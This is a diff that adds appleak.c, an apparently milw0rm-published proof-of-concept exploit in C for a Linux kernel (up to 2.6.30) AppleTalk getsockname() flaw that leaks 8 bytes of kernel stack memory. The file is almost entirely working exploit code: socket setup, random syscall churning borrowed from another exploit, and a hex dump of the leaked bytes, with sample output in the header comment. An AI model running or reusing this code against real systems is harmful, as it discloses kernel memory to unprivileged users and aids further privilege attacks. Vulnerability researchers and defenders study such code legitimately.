@@ -1,0 +1,149 @@
+/**
+ * appleak.c
+ *
+ * Linux keunouille <= 2.6.30
+ *
+ * AppleTalk getsockname() 8-bytes kernel stack disclosure
+ *
+ * http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=3d392475c873c10c10d6d96b94d092a34ebd4791
+ *
+ * atalk_getname() can leak 8 bytes of kernel memory to user
+ *
+ * [clem1@noe ~]$ ./appleak
+ * 1e 83 f2 31 ec 56 d7 f6 | ...1.V..
+ * 00 f4 55 f6 84 2a ca bf | ..U..*..
+ * 00 f4 55 f6 1e 83 f2 31 | ..U....1
+ * 1e 83 f2 31 00 60 5e f6 | ...1.`^.
+ * 00 f4 55 f6 84 2a ca bf | ..U..*..
+ * c0 2a 54 c0 a8 61 45 f6 | .*T..aE.
+ * 21 54 12 c0 84 2a ca bf | !T...*..
+ * (...)
+ *
+ * (c) Clément LECIGNE <root[a]clem1.be>
+ */
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <errno.h>
+#include <unistd.h>
+#include <time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <net/if_arp.h>
+#include <linux/atalk.h>
+
+void kernop(int fd)
+{
+    /* from Jon Oberheide sploit
+     */
+    const int   randcalls[] = {
+        __NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
+        __NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl, 
+        __NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup, 
+        __NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl, 
+        __NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday, 
+        __NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
+        __NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid, 
+        __NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority, 
+        __NR_sched_getparam, __NR_sched_get_priority_max
+    };
+    const int   randsopts[] = { SOL_SOCKET, AF_APPLETALK };
+    int         ret, len;
+    char        buf[1024];
+
+    do
+    {
+        switch ( rand() % 3 )
+        {
+            case 0:
+                ret = syscall(randcalls[rand() % sizeof(randcalls)/sizeof(randcalls[0])]);
+                break;
+            case 1:
+                len = (rand() % 2) ? sizeof(int) : sizeof(buf);
+                ret = getsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, &len);
+                break;
+            case 2:
+                len = (rand() % 2) ? sizeof(int) : sizeof(buf);
+                ret = setsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, len);
+                break;
+        }
+    }
+    while ( ret < 0 );
+}
+
+void dump( unsigned char * data, unsigned int len )
+{
+    unsigned int dp, p;
+    const char trans[] =
+    "................................ !\"#$%&'()*+,-./0123456789"
+    ":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
+    "nopqrstuvwxyz{|}~...................................."
+    "....................................................."
+    "........................................";
+
+    for ( dp = 1; dp <= len; dp++ )
+    {
+        printf("%02x ", data[dp-1]);
+        if ( (dp % 8) == 0 )
+        {
+            printf("| ");
+            p = dp;
+            for ( dp -= 8; dp < p; dp++ ) {
+                printf("%c", trans[data[dp]]);
+            }
+            printf("\n");
+        }
+    }
+
+    return;
+}
+
+int main(void)
+{
+    struct sockaddr_at  sat;
+    int                 s, len = sizeof(sat), occ = 500;
+    char                prev_zero[sizeof(sat.sat_zero)] = { 0 };
+
+    s = socket(AF_APPLETALK, SOCK_DGRAM, 0);
+    if ( s == -1 )
+    {
+        perror("socket");
+        return EXIT_FAILURE;
+    }
+
+    memset(&sat, 0, sizeof(sat));
+    sat.sat_family = AF_APPLETALK;
+    sat.sat_addr.s_net = htons(ATADDR_ANYNET);
+    sat.sat_addr.s_node = ATADDR_ANYNODE;
+    sat.sat_port = ATADDR_ANYPORT;
+
+    if ( bind(s, (struct sockaddr *) &sat, len) < 0 )
+    {
+        perror("bind");
+        return EXIT_FAILURE;
+    }
+
+    srand(time(NULL) ^ getpid());
+
+    while ( --occ )
+    {
+        kernop(s);
+
+        if ( getsockname(s, (struct sockaddr *) &sat, &len) == 0 )
+        {
+            if ( memcmp(sat.sat_zero, prev_zero, sizeof(sat.sat_zero)) != 0 )
+            {
+                dump((unsigned char *) &sat.sat_zero, sizeof(sat.sat_zero));
+                memcpy(&prev_zero, &sat.sat_zero, sizeof(sat.sat_zero));
+                usleep(5000);
+            }
+        }
+    }
+
+    close(s);
+
+    return EXIT_SUCCESS;
+}
+
+// milw0rm.com [2009-08-26]
